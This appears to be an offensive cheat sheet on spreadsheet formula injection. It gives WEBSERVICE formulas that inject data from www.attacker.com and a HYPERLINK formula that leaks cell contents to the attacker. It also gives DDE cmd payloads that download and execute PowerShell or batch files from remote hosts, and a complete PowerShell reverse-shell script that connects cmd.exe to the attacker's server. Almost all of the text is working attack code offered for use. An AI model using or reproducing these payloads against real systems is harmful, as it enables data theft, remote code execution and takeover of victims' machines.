Useful Links
---------------------------------------------
https://www.notsosecure.com/data-exfiltration-formula-injection/

Use Webservice Formula to Inject fake data into Speadsheet
----------------------------------------------------------
In cell "A1" enter the following - Could be "First Name" in web form
=WEBSERVICE("http://www.attacker.com")

Run attacking server
php -S www.attacker.com:80

On attacking server create "index.html" with content you want to change the "fake data" too.
```
############ Begin index.html ##################################
Fake Data
############ End index.html ####################################
```
To fill in multiple cells use multiple html file
```
=WEBSERVICE("http://www.attacker.com/al.html")
############ Begin a1.html ##################################
Fake
############ End a1.html ####################################
```
```
=WEBSERVICE("http://www.attacker.com/a2.html")
############ Begin a2.html ##################################
Data
############ End a2.html ####################################
```

Use Hyperlink formula to send data to attacking server
------------------------------------------------------
```
# This will send the data from cells "C2" and "D2" to the attackers server using the GET method. 
=HYPERLINK("http://www.attacker.com?leak="&C2&D2,"Please click for further information")
```

Execute content when the spreadsheet loads
------------------------------------------------
```
# Works with any payload, will open associated extension or run exe, bat, etc....
=cmd|'/C powershell Import-Module BitsTransfer;Start-BitsTransfer -source http://xxx.xxx.xxx.xxx/index.jpeg;Start-Process index.jpeg'!A0
=cmd|'/C powershell Import-Module BitsTransfer;Start-BitsTransfer -source http://xxx.xxx.xxx.xxx/ps.bat;Start-Process ps.bat'!A0
```


Another example to use when the form size is limited
------------------------------------------------
```
# Will download powershell from attackers server and execute it
=cmd|' /C powershell IEX(wget 10.5.21.41/p.ps1)'!A0

function cleanup {
if ($client.Connected -eq $true) {$client.Close()}
if ($process.ExitCode -ne $null) {$process.Close()}
exit}
$address = 'www.attacker.com'
$port = '80'
$client = New-Object system.net.sockets.tcpclient
$client.connect($address,$port)
$stream = $client.GetStream()
$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
$process.StartInfo.RedirectStandardInput = 1
$process.StartInfo.RedirectStandardOutput = 1
$process.StartInfo.UseShellExecute = 0
$process.Start()
$inputstream = $process.StandardInput
$outputstream = $process.StandardOutput
Start-Sleep 1
$encoding = new-object System.Text.AsciiEncoding
while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
$stream.Write($encoding.GetBytes($out),0,$out.Length)
$out = $null; $done = $false; $testing = 0;
while (-not $done) {
if ($client.Connected -ne $true) {cleanup}
$pos = 0; $i = 1
while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
if ($pos -gt 0) {
$string = $encoding.GetString($networkbuffer,0,$pos)
$inputstream.write($string)
start-sleep 1
if ($process.ExitCode -ne $null) {cleanup}
else {
$out = $encoding.GetString($outputstream.Read())
while($outputstream.Peek() -ne -1){
$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
$stream.Write($encoding.GetBytes($out),0,$out.length)
$out = $null
$string = $null}} else {cleanup}}
```
